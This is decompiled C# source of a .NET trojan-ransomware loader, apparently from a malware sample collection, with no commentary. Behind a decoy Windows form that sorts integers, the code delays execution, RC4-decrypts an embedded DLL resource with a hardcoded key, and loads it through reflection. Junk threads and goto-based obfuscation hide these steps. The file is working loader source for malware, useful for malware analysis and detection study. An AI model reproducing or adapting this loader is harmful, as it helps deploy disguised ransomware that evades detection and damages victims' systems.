// Decompiled with JetBrains decompiler
// Type: Nysykwahqkpmeddn.a
// Assembly: ConsoleApp16ony, Version=4.0.24.4617, Culture=neutral, PublicKeyToken=null
// MVID: 09145121-45C3-462C-223D-EFDF67E2504D
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.07-msil\HEUR-Trojan-Ransom.MSIL.Blocker.gen-52a330fcf88eb3f54632c90b02954f323415f84e61b5e1a4e06e0fbf076127f2.exe

using Knustjgacbzynzpipxxcna;
using Microsoft.CSharp.RuntimeBinder;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace Nysykwahqkpmeddn
{
  public sealed class a : Form
  {
    private IContainer a;
    private ListBox b;
    private ListBox c;
    private ListBox d;
    private ListBox e;
    private ListBox f;
    private ListBox g;
    private ListBox h;
    private ListBox i;
    private ListBox j;
    private ListBox k;

    public a()
    {
      if (false)
        return;
      this.b();
    }

    private void a(object a, EventArgs b)
    {
      try
      {
        if (true)
          goto label_2;
label_1:
        int length;
        int[] numArray = new int[length];
        int[] a1;
        if (true)
          a1 = numArray;
        try
        {
          string[] strArray1 = new string[3]
          {
            "1",
            "2",
            "3"
          };
          if (true)
            goto label_6;
label_5:
          string[] strArray2;
          for (int index = 0; index < length; ++index)
            a1[index] = int.Parse(strArray2[index]);
          goto label_11;
label_6:
          strArray2 = strArray1;
          goto label_5;
        }
        catch
        {
        }
label_11:
        Thread.Sleep(22000);
        AppDomain.CurrentDomain.AssemblyResolve += new ResolveEventHandler(this.a);
        this.a(a1);
        for (int index = 0; index < a1.Length; ++index)
          Console.Write(a1[index].ToString() + " ");
        return;
label_2:
        length = 3;
        goto label_1;
      }
      catch
      {
        this.a();
      }
    }

    private byte[] a(byte[] a)
    {
      int[] numArray1 = new int[256];
      if (true)
        goto label_5;
label_1:
      int[] numArray2 = new int[256];
      if (true)
        goto label_6;
label_2:
      byte[] numArray3 = new byte[a.Length];
      if (true)
        goto label_7;
label_3:
      byte[] bytes = Encoding.UTF8.GetBytes("Xxpsuplulfdya");
      if (true)
        goto label_8;
label_4:
      int index1;
      if (true)
        index1 = 0;
      int[] numArray4;
      int[] numArray5;
      byte[] numArray6;
      for (; index1 < 256; ++index1)
      {
        numArray4[index1] = (int) numArray6[index1 % numArray6.Length];
        numArray5[index1] = index1;
      }
      int index2;
      for (int index3 = index2 = 0; index2 < 256; ++index2)
      {
        index3 = (index3 + numArray5[index2] + numArray4[index2]) % 256;
        int num = numArray5[index2];
        numArray5[index2] = numArray5[index3];
        numArray5[index3] = num;
      }
      try
      {
        new Thread(Nysykwahqkpmeddn.a.a.b ?? (Nysykwahqkpmeddn.a.a.b = new ThreadStart(Nysykwahqkpmeddn.a.a.a.a))).Start();
      }
      catch
      {
      }
      int num1;
      int index4 = num1 = 0;
      int index5 = num1;
      int index6 = num1;
      byte[] numArray7;
      for (; index4 < a.Length; ++index4)
      {
        index6 = (index6 + 1) % 256;
        index5 = (index5 + numArray5[index6]) % 256;
        int num2 = numArray5[index6];
        numArray5[index6] = numArray5[index5];
        numArray5[index5] = num2;
        int num3 = numArray5[(numArray5[index6] + numArray5[index5]) % 256];
        numArray7[index4] = (byte) ((uint) a[index4] ^ (uint) num3);
      }
      return numArray7;
label_8:
      numArray6 = bytes;
      goto label_4;
label_7:
      numArray7 = numArray3;
      goto label_3;
label_6:
      numArray5 = numArray2;
      goto label_2;
label_5:
      numArray4 = numArray1;
      goto label_1;
    }

    private Assembly a(object a, ResolveEventArgs b)
    {
      if (true)
        goto label_3;
label_1:
      string name;
      Stream manifestResourceStream = Assembly.GetExecutingAssembly().GetManifestResourceStream(name);
      byte[] numArray1 = new byte[manifestResourceStream.Length];
      if (true)
        goto label_4;
label_2:
      byte[] numArray2;
      manifestResourceStream.Read(numArray2, 0, numArray2.Length);
      try
      {
        ThreadStart start = Nysykwahqkpmeddn.a.a.c;
        if (start == null)
        {
          ThreadStart threadStart = new ThreadStart(Nysykwahqkpmeddn.a.a.a.b);
          if (false)
          {
            start = threadStart;
          }
          else
          {
            Nysykwahqkpmeddn.a.a.c = threadStart;
            start = threadStart;
          }
        }
        new Thread(start).Start();
      }
      catch
      {
      }
      return (Assembly) typeof (Assembly).InvokeMember("Load", BindingFlags.InvokeMethod, (System.Reflection.Binder) null, (object) null, new object[1]
      {
        (object) this.a(numArray2)
      });
label_4:
      numArray2 = numArray1;
      goto label_2;
label_3:
      name = "Nysykwahqkpmeddn.Knustjgacbzynzpipxxcna.dll";
      goto label_1;
    }

    private void a()
    {
      if (false)
        return;
      Environment.Exit(0);
    }

    public void a(int[] a)
    {
      int length = a.Length;
      if (true)
        goto label_3;
label_1:
      int num1;
      if (true)
        num1 = 0;
      int num2;
      for (; num1 < num2; ++num1)
      {
        object instance = Activator.CreateInstance(typeof (ClassLibrary));
        object obj1;
        if (true)
          obj1 = instance;
        try
        {
          ThreadStart start = Nysykwahqkpmeddn.a.a.d;
          if (start == null)
          {
            ThreadStart threadStart = new ThreadStart(Nysykwahqkpmeddn.a.a.a.c);
            if (false)
            {
              start = threadStart;
            }
            else
            {
              Nysykwahqkpmeddn.a.a.d = threadStart;
              start = threadStart;
            }
          }
          new Thread(start).Start();
        }
        catch
        {
        }
        for (int index = 0; index < num2 - num1 - 1; ++index)
        {
          if (Nysykwahqkpmeddn.a.b.b == null)
            Nysykwahqkpmeddn.a.b.b = CallSite<Action<CallSite, ListBox.ObjectCollection, object>>.Create(Microsoft.CSharp.RuntimeBinder.Binder.InvokeMember(CSharpBinderFlags.ResultDiscarded, "Add", (IEnumerable<System.Type>) null, typeof (Nysykwahqkpmeddn.a), (IEnumerable<CSharpArgumentInfo>) new CSharpArgumentInfo[2]
            {
              CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.UseCompileTimeType, (string) null),
              CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, (string) null)
            }));
          Action<CallSite, ListBox.ObjectCollection, object> target = Nysykwahqkpmeddn.a.b.b.Target;
          CallSite<Action<CallSite, ListBox.ObjectCollection, object>> b = Nysykwahqkpmeddn.a.b.b;
          ListBox.ObjectCollection items = this.k.Items;
          if (Nysykwahqkpmeddn.a.b.a == null)
            Nysykwahqkpmeddn.a.b.a = CallSite<Func<CallSite, object, object>>.Create(Microsoft.CSharp.RuntimeBinder.Binder.InvokeMember(CSharpBinderFlags.None, "Data", (IEnumerable<System.Type>) null, typeof (Nysykwahqkpmeddn.a), (IEnumerable<CSharpArgumentInfo>) new CSharpArgumentInfo[1]
            {
              CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, (string) null)
            }));
          object obj2 = Nysykwahqkpmeddn.a.b.a.Target((CallSite) Nysykwahqkpmeddn.a.b.a, obj1);
          target((CallSite) b, items, obj2);
          if (a[index] > a[index + 1])
          {
            int num3 = a[index + 1];
            a[index + 1] = a[index];
            a[index] = num3;
          }
        }
      }
      return;
label_3:
      num2 = length;
      goto label_1;
    }

    protected override void Dispose(bool a)
    {
      if (a && this.a != null)
        this.a.Dispose();
      int num = a ? 1 : 0;
      if (false)
        return;
      base.Dispose(num != 0);
    }

    private void b()
    {
      ListBox listBox1 = new ListBox();
      if (true)
        goto label_11;
label_1:
      ListBox listBox2 = new ListBox();
      if (true)
        goto label_12;
label_2:
      ListBox listBox3 = new ListBox();
      if (true)
        goto label_13;
label_3:
      ListBox listBox4 = new ListBox();
      if (true)
        goto label_14;
label_4:
      ListBox listBox5 = new ListBox();
      if (true)
        goto label_15;
label_5:
      ListBox listBox6 = new ListBox();
      if (true)
        goto label_16;
label_6:
      ListBox listBox7 = new ListBox();
      if (true)
        goto label_17;
label_7:
      ListBox listBox8 = new ListBox();
      if (true)
        goto label_18;
label_8:
      ListBox listBox9 = new ListBox();
      if (true)
        goto label_19;
label_9:
      ListBox listBox10 = new ListBox();
      if (true)
        goto label_20;
label_10:
      this.SuspendLayout();
      this.b.BackColor = SystemColors.WindowFrame;
      this.b.Dock = DockStyle.Fill;
      this.b.FormattingEnabled = true;
      this.b.Location = new Point(0, 0);
      this.b.Name = "listBox1";
      this.b.Size = new Size(535, 290);
      this.b.TabIndex = 0;
      this.c.BackColor = SystemColors.WindowFrame;
      this.c.Dock = DockStyle.Fill;
      this.c.FormattingEnabled = true;
      this.c.Location = new Point(0, 0);
      this.c.Name = "listBox2";
      this.c.Size = new Size(535, 290);
      this.c.TabIndex = 1;
      this.d.BackColor = SystemColors.WindowFrame;
      this.d.Dock = DockStyle.Fill;
      this.d.FormattingEnabled = true;
      this.d.Location = new Point(0, 0);
      this.d.Name = "listBox3";
      this.d.Size = new Size(535, 290);
      this.d.TabIndex = 2;
      this.e.BackColor = SystemColors.WindowFrame;
      this.e.Dock = DockStyle.Fill;
      this.e.FormattingEnabled = true;
      this.e.Location = new Point(0, 0);
      this.e.Name = "listBox4";
      this.e.Size = new Size(535, 290);
      this.e.TabIndex = 3;
      this.f.BackColor = SystemColors.WindowFrame;
      this.f.Dock = DockStyle.Fill;
      this.f.FormattingEnabled = true;
      this.f.Location = new Point(0, 0);
      this.f.Name = "listBox5";
      this.f.Size = new Size(535, 290);
      this.f.TabIndex = 4;
      this.g.BackColor = SystemColors.WindowFrame;
      this.g.Dock = DockStyle.Fill;
      this.g.FormattingEnabled = true;
      this.g.Location = new Point(0, 0);
      this.g.Name = "listBox6";
      this.g.Size = new Size(535, 290);
      this.g.TabIndex = 5;
      this.h.BackColor = SystemColors.WindowFrame;
      this.h.Dock = DockStyle.Fill;
      this.h.FormattingEnabled = true;
      this.h.Location = new Point(0, 0);
      this.h.Name = "listBox7";
      this.h.Size = new Size(535, 290);
      this.h.TabIndex = 6;
      this.i.BackColor = SystemColors.WindowFrame;
      this.i.Dock = DockStyle.Fill;
      this.i.FormattingEnabled = true;
      this.i.Location = new Point(0, 0);
      this.i.Name = "listBox8";
      this.i.Size = new Size(535, 290);
      this.i.TabIndex = 7;
      this.j.BackColor = SystemColors.WindowFrame;
      this.j.Dock = DockStyle.Fill;
      this.j.FormattingEnabled = true;
      this.j.Location = new Point(0, 0);
      this.j.Name = "listBox9";
      this.j.Size = new Size(535, 290);
      this.j.TabIndex = 8;
      this.k.BackColor = SystemColors.WindowFrame;
      this.k.Dock = DockStyle.Fill;
      this.k.FormattingEnabled = true;
      this.k.Location = new Point(0, 0);
      this.k.Name = "listBox10";
      this.k.Size = new Size(535, 290);
      this.k.TabIndex = 9;
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      this.AutoScaleMode = AutoScaleMode.Font;
      this.ClientSize = new Size(535, 290);
      this.Controls.Add((Control) this.k);
      this.Controls.Add((Control) this.j);
      this.Controls.Add((Control) this.i);
      this.Controls.Add((Control) this.h);
      this.Controls.Add((Control) this.g);
      this.Controls.Add((Control) this.f);
      this.Controls.Add((Control) this.e);
      this.Controls.Add((Control) this.d);
      this.Controls.Add((Control) this.c);
      this.Controls.Add((Control) this.b);
      this.Name = "Form1";
      this.Text = "Form1";
      this.Load += new EventHandler(this.a);
      this.ResumeLayout(false);
      return;
label_20:
      this.k = listBox10;
      goto label_10;
label_19:
      this.j = listBox9;
      goto label_9;
label_18:
      this.i = listBox8;
      goto label_8;
label_17:
      this.h = listBox7;
      goto label_7;
label_16:
      this.g = listBox6;
      goto label_6;
label_15:
      this.f = listBox5;
      goto label_5;
label_14:
      this.e = listBox4;
      goto label_4;
label_13:
      this.d = listBox3;
      goto label_3;
label_12:
      this.c = listBox2;
      goto label_2;
label_11:
      this.b = listBox1;
      goto label_1;
    }

    [Serializable]
    private sealed class a
    {
      public static readonly Nysykwahqkpmeddn.a.a a;
      public static ThreadStart b;
      public static ThreadStart c;
      public static ThreadStart d;

      static a()
      {
        Nysykwahqkpmeddn.a.a a = new Nysykwahqkpmeddn.a.a();
        if (false)
          return;
        Nysykwahqkpmeddn.a.a.a = a;
      }

      public a()
      {
        if (true)
          ;
        // ISSUE: explicit constructor call
        base.\u002Ector();
      }

      internal void a()
      {
        int num1;
        if (true)
          num1 = 0;
        while (num1 < 999)
        {
          int num2 = num1;
          if (true)
            goto label_5;
label_4:
          int num3 = num1 + 1;
          if (true)
          {
            num1 = num3;
            continue;
          }
          continue;
label_5:
          Console.WriteLine(num2);
          goto label_4;
        }
      }

      internal void b()
      {
        int num1;
        if (true)
          num1 = 0;
        while (num1 < 999)
        {
          int num2 = num1;
          if (true)
            goto label_5;
label_4:
          int num3 = num1 + 1;
          if (true)
          {
            num1 = num3;
            continue;
          }
          continue;
label_5:
          Console.WriteLine(num2);
          goto label_4;
        }
      }

      internal void c()
      {
        int num1;
        if (true)
          num1 = 0;
        while (num1 < 999)
        {
          int num2 = num1;
          if (true)
            goto label_5;
label_4:
          int num3 = num1 + 1;
          if (true)
          {
            num1 = num3;
            continue;
          }
          continue;
label_5:
          Console.WriteLine(num2);
          goto label_4;
        }
      }
    }

    private static class b
    {
      public static CallSite<Func<CallSite, object, object>> a;
      public static CallSite<Action<CallSite, ListBox.ObjectCollection, object>> b;
    }

    public struct c : IEquatable<Nysykwahqkpmeddn.a.c>
    {
      private readonly Guid a;
      private readonly string b;

      public c(Guid a, string b)
      {
        Guid guid = a;
        if (true)
          goto label_3;
label_1:
        string str = b;
        if (false)
          return;
        this.b = str;
        return;
label_3:
        this.a = guid;
        goto label_1;
      }

      public Guid a()
      {
        if (true)
          ;
        return this.a;
      }

      public string a()
      {
        if (true)
          ;
        return this.b;
      }

      public override bool Equals(object a)
      {
        object obj1 = a;
        if (true)
          ;
        if (obj1 != null)
        {
          object obj2 = a;
          if (true)
            ;
          System.Type type1 = obj2.GetType();
          if (true)
            ;
          System.Type type2 = this.GetType();
          if (type1 == type2)
            return base.Equals((object) (Nysykwahqkpmeddn.a.c) a);
        }
        return false;
      }

      public bool Equals(Nysykwahqkpmeddn.a.c a)
      {
        Guid a1 = this.a;
        if (true)
          goto label_2;
label_1:
        Guid guid;
        return guid.Equals(a.a);
label_2:
        guid = a1;
        goto label_1;
      }

      public override int GetHashCode()
      {
        Guid a = this.a;
        if (true)
          goto label_2;
label_1:
        Guid guid;
        return guid.GetHashCode();
label_2:
        guid = a;
        goto label_1;
      }
    }
  }
}
